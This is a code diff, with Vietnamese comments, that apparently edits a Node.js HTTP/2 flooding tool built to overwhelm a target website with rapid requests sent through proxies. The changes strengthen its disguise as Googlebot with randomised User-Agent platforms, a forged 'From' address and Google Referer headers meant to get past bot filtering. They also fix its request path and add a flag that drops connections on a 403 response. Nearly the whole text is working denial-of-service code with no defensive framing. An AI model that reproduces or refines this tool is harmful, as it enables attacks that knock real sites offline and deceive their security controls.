@@ -19,7 +19,7 @@ const cplist = ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA2
 const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
 const ecdhCurve = ["GREASE:x25519:secp256r1:secp384r1", "x25519"];
 function getRandomGooglebotUserAgent() {
-    // Các phiên bản của Googlebot
+    // Các phiên bản Googlebot chính thức
     const googlebotVersions = [
         "Googlebot/2.1",
         "Googlebot-Mobile/2.1",
@@ -30,7 +30,7 @@ function getRandomGooglebotUserAgent() {
         "Googlebot-Ads/2.1"
     ];
 
-    // Các phiên bản Chrome giả lập
+    // Các phiên bản trình duyệt Chrome giả lập
     const chromeVersions = [
         "Chrome/90.0.4430.93",
         "Chrome/91.0.4472.124",
@@ -39,20 +39,34 @@ function getRandomGooglebotUserAgent() {
         "Chrome/94.0.4606.61"
     ];
 
-    // Lựa chọn ngẫu nhiên Googlebot version
+    // Các nền tảng giả lập (có thể thay đổi cho phù hợp với thiết bị hoặc trình duyệt khác)
+    const platforms = [
+        "Windows NT 10.0; Win64; x64",        // Windows 10
+        "Linux; Android 10; Google Pixel 4",     // Android
+        "Macintosh; Intel Mac OS X 10_15_7",   // macOS
+        "iPhone; CPU iPhone OS 14_2 like Mac OS X", // iOS
+        "Linux; Ubuntu 18.04; x86_64"         // Linux
+    ];
+
+    // Chọn ngẫu nhiên phiên bản Googlebot
     const randomGooglebotVersion = googlebotVersions[Math.floor(Math.random() * googlebotVersions.length)];
 
-    // Lựa chọn ngẫu nhiên Chrome version
+    // Chọn ngẫu nhiên phiên bản Chrome
     const randomChromeVersion = chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
 
-    // Tạo User-Agent hoàn chỉnh
-    const userAgent = `Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) ${randomChromeVersion} Mobile Safari/537.36 (compatible; ${randomGooglebotVersion}; +http://www.google.com/bot.html)`;
+    // Chọn ngẫu nhiên nền tảng
+    const randomPlatform = platforms[Math.floor(Math.random() * platforms.length)];
+
+    // Tạo User-Agent hoàn chỉnh, giả lập một yêu cầu từ Googlebot
+    const userAgent = `Mozilla/5.0 (${randomPlatform}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomChromeVersion} Mobile Safari/537.36 (compatible; ${randomGooglebotVersion}; +http://www.google.com/bot.html)`;
 
     return userAgent;
 }
 
 // Lấy User-Agent Googlebot ngẫu nhiên
 const randomUserAgent = getRandomGooglebotUserAgent();
+
+
 
 const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_TICKET;
 const secureProtocol = "TLS_method";
@@ -75,7 +89,8 @@ const args = {
     icecool: process.argv.includes('--icecool'), // icecool optimaze ram, cpu
     dual: process.argv.includes('--dual'), // dualhyper
     brave: process.argv.includes('--brave'),
-    google: process.argv.includes('--google')
+    google: process.argv.includes('--google'),
+    close: process.argv.includes('--close')
 };
 
 var proxies = readLines(args.proxyFile); // Initialize proxies here
@@ -247,7 +262,7 @@ function runFlooder() {
         ":method": randomElement(Methods),
         ":scheme": "https",
         ":authority": parsedTarget.host,
-        ":path": parsedTarget.host,
+        ":path": path,
         'User-Agent': finalUa,
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
         'Accept-Language': ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'],
@@ -330,74 +345,79 @@ function runFlooder() {
         }        
                 if (args.google) {
             tlsOptions.ALPNProtocols = ['h2'];
-            tlsOptions.maxVersion = 'TLSv1.3';
-            tlsOptions.minVersion = 'TLSv1.2';
-            tlsOptions.ciphers = randomElement(cplist);
-            tlsOptions.dhparam = 'modp4096';
+tlsOptions.maxVersion = 'TLSv1.3';
+tlsOptions.minVersion = 'TLSv1.2';
+tlsOptions.ciphers = randomElement(cplist);
+tlsOptions.dhparam = 'modp4096';
+headersbex['User-Agent'] = getRandomGooglebotUserAgent();
+headersbex["sec-ch-ua"] = `"Google Chrome"; v="94", "Not A Brand"; v="99", "Chromium"; v="94"`;
+headersbex['DNT'] = '1';  // Do Not Track
+headersbex['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
+headersbex['Accept-Encoding'] = 'gzip, deflate, br';  // Hỗ trợ nén nội dung
+headersbex['Accept-Language'] = "en-US,en;q=0.9,vi;q=0.8";
+headersbex['From'] = 'googlebot(at)googlebot.com';
+headersbex['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()';  // Chặn các tính năng cho quyền riêng tư
+headersbex['Pragma'] = 'no-cache';  // Đảm bảo không lưu trữ bộ đệm
+headersbex['Sec-Fetch-Site'] = 'same-origin';  // Yêu cầu từ cùng một nguồn
+headersbex['Sec-Fetch-Mode'] = 'navigate';  // Chế độ điều hướng
+headersbex['Sec-Fetch-Dest'] = 'document';  // Đích đến là tài liệu
+headersbex['X-Content-Type-Options'] = 'nosniff';
 
-            headersbex['User-Agent'] = getRandomGooglebotUserAgent();
-            headersbex["sec-ch-ua"] = `"Google Chrome"; v="94", "Not A Brand"; v="99", "Chromium"; v="94"`
-            
-            headersbex['sec-ch-ua-mobile'] = '?1';  // Indicates a mobile device (iPhone)
-            headersbex['sec-ch-ua-platform'] = '"iOS"';  // Indicates iOS platform
-            headersbex['DNT'] = '1';  // Do Not Track
-            headersbex['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
-            headersbex['Accept-Encoding'] = 'gzip, deflate, br';  // Support for compressed content
-            headersbex['Accept-Language'] = "en-US,en;q=0.9,vi;q=0.8";
+// Các tiêu đề có thể được thêm ngẫu nhiên để mô phỏng hành vi người dùng thực tế
+if (Math.random() < 0.3) headersbex['X-Requested-With'] = 'XMLHttpRequest';
+if (Math.random() < 0.9) headersbex['Referer'] = 'https://www.google.com/';
+if (Math.random() < 0.1) headersbex['Origin'] = 'https://www.google.com/';
 
-            headersbex['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()';  // Block certain features for privacy
-            headersbex['Pragma'] = 'no-cache';  // Privacy protection, avoid caching
-            headersbex['Sec-Fetch-Site'] = 'same-origin';  // Same origin requests
-            headersbex['Sec-Fetch-Mode'] = 'navigate';  // Navigation mode
-            headersbex['Sec-Fetch-Dest'] = 'document';  // Target is a document
-            headersbex['X-Content-Type-Options'] = 'nosniff';
-            if (Math.random() < 0.3) headersbex['X-Requested-With'] = 'XMLHttpRequest';
-            if (Math.random() < 0.2) headersbex['Referer'] = 'https://www.google.com/';
-            if (Math.random() < 0.1) headersbex['Origin'] = 'https://www.google.com/';
         }        
 
-        const tlsBex = tls.connect(443, parsedTarget.host, tlsOptions);
+ const tlsBex = tls.connect(443, parsedTarget.host, tlsOptions);
 
-        tlsBex.allowHalfOpen = true;
-        tlsBex.setNoDelay(true);
-        tlsBex.setKeepAlive(true, args.time * 1000);
-        tlsBex.setMaxListeners(0);
+tlsBex.allowHalfOpen = true;
+tlsBex.setNoDelay(true);
+tlsBex.setKeepAlive(true, args.time * 1000);
+tlsBex.setMaxListeners(0);
 
-        const bexClient = http2.connect(parsedTarget.href, {
-            protocol: "https:",
-            createConnection: () => tlsBex,
-            settings: {
-                headerTableSize: 65536,
-                maxConcurrentStreams: 1000,
-                initialWindowSize: 6291456,
-                maxFrameSize: 16384,
-                enablePush: false,
-            },
-        });
+const bexClient = http2.connect(parsedTarget.href, {
+    protocol: "https:",
+    createConnection: () => tlsBex,
+    settings: {
+        headerTableSize: 65536,
+        maxConcurrentStreams: 1000,
+        initialWindowSize: 6291456,
+        maxFrameSize: 16384,
+        enablePush: false,
+    },
+});
 
-        const requestRate = args.dual ? args.Rate * 2 : args.Rate;
-        const requestInterval = args.icecool ? Math.floor(1000 / requestRate) + randomIntn(100, 200) : 1000 / requestRate;
-        const IntervalAttack = setInterval(() => {
-            for (let i = 0; i < requestRate; i++) {
-                const bex = bexClient.request(headersbex)
-                    .on('response', response => {
-                        bex.close();
-                        bex.destroy();
-                    });
-                bex.end();
-            }
-        }, requestInterval);
+const requestRate = args.dual ? args.Rate * 2 : args.Rate;
+const requestInterval = args.icecool ? Math.floor(1000 / requestRate) + randomIntn(100, 200) : 1000 / requestRate;
 
-        setTimeout(() => clearInterval(IntervalAttack), args.time * 500);
+const IntervalAttack = setInterval(() => {
+    for (let i = 0; i < requestRate; i++) {
+        const bex = bexClient.request(headersbex)
+            .on('response', (response) => {
+                // Kiểm tra mã phản hồi
+                if (response.statusCode === 403 && args.close ) {
+                    bexClient.destroy();  
+                    connection.destroy(); 
+                }
+                    bex.close();
+                    bex.destroy();
+            });
+        bex.end();
+    }
+}, requestInterval);
 
-        bexClient.on("close", () => {
-            bexClient.destroy();
-            connection.destroy();
-        });
+setTimeout(() => clearInterval(IntervalAttack), args.time * 300);
 
-        bexClient.on("error", () => {
-            bexClient.destroy();
-            connection.destroy();
+bexClient.on("close", () => {
+    bexClient.destroy();
+    connection.destroy();
+});
+
+bexClient.on("error", () => {
+    bexClient.destroy();
+    connection.destroy();
         });
     });
 }
